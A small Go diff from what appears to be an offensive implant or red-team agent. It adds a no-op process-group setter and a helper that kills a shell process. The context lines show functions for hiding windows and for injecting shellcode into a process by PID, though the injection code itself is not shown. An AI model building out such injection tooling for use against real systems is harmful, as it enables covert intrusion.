@@ -276,6 +276,14 @@ func applyHideWindow(cmd *exec.Cmd) {
 	}
 }
 
+func setShellProcGroup(cmd *exec.Cmd) {}
+
+func killShellProcGroup(cmd *exec.Cmd) {
+	if cmd != nil && cmd.Process != nil {
+		_ = cmd.Process.Kill()
+	}
+}
+
 func injectProcess(pid uint32, shellcode []byte, tech string) error {
 	if len(shellcode) == 0 {
 		return fmt.Errorf("empty shellcode")
